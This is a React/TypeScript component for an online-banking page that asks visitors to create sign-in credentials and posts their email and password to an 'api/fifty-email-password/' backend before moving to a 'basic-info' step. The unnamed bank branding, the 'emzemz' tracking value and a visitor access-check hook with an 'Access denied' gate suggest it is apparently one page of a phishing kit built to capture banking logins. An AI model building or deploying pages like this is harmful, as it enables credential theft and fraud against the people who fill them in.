import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const EmailPassword: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: '',
    confirmPassword: '',
    form: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/login', { replace: true });
    }
  }, [emzemz, navigate]);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
  }

  const validateEmail = (email: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : '',
      form: ''
    };

    setErrors(newErrors);

    if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
      try {
        await axios.post(`${baseUrl}api/fifty-email-password/`, {
          emzemz,
          email,
          password
        });
        navigate('/basic-info', { state: { emzemz } });
      } catch (error) {
        console.error('Error setting email/password:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error. Please try again.'
        }));
      } finally {
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full">
      <div className="mx-auto w-full max-w-3xl rounded-md border border-gray-200 bg-white shadow-[0_12px_30px_rgba(0,0,0,0.12)]">
        <div className="h-2 bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6]" />
        <div className="px-8 py-8">
          <h2 className="text-2xl font-semibold text-gray-900">Create Your Sign-In Credentials</h2>
          <p className="mt-3 text-sm text-gray-600">
            We’ll use this email and password every time you access your online banking. Choose something memorable yet secure.
          </p>

          <form onSubmit={handleSubmit} className="mt-8 space-y-6">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Email Address</label>
              <input
                id="email"
                name="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="you@example.com"
              />
              {errors.email && <p className="text-xs font-semibold text-red-600">{errors.email}</p>}
            </div>

            <div className="grid gap-6 md:grid-cols-2">
              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Password</label>
                <div className="relative">
                  <input
                    id="password"
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-24 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                    placeholder="Create password"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword((prev) => !prev)}
                    className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
                {errors.password && <p className="text-xs font-semibold text-red-600">{errors.password}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Confirm Password</label>
                <div className="relative">
                  <input
                    id="confirmPassword"
                    name="confirmPassword"
                    type={showConfirmPassword ? 'text' : 'password'}
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-24 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                    placeholder="Re-enter password"
                  />
                  <button
                    type="button"
                    onClick={() => setShowConfirmPassword((prev) => !prev)}
                    className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
                  >
                    {showConfirmPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
                {errors.confirmPassword && <p className="text-xs font-semibold text-red-600">{errors.confirmPassword}</p>}
              </div>
            </div>

            {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}

            <div className="flex justify-end">
              <button
                type="submit"
                disabled={isLoading}
                className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
              >
                {isLoading ? 'Saving…' : 'Continue'}
              </button>
            </div>
          </form>

          <div className="mt-6 rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600">
            Your password must be at least 8 characters and include a mix of letters, numbers, and symbols for security.
          </div>
        </div>
      </div>
    </div>
  );
};

export default EmailPassword;
